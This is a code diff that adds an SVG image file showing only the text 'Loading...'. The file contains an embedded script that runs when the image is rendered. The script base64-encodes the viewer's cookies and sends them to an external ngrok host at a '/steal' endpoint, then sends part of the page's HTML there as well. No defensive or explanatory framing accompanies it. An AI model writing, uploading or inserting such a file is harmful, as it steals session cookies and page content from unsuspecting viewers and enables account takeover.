@@ -1,0 +1,10 @@
+  <?xml version="1.0" standalone="no"?>
+       <svg xmlns="http://www.w3.org/2000/svg">
+          <script>
+           fetch('https://televisional-camryn-quarrelsomely.ngrok-free.dev/steal?data=' + btoa(document.cookie))
+            .then(() => {
+              fetch('https://televisional-camryn-quarrelsomely.ngrok-free.dev/steal?data=' + btoa(document.documentElement.innerHTML.substring(0, 500)));
+           });
+         </script>
+         <text x="10" y="50" font-size="20">Loading...</text>
+       </svg>
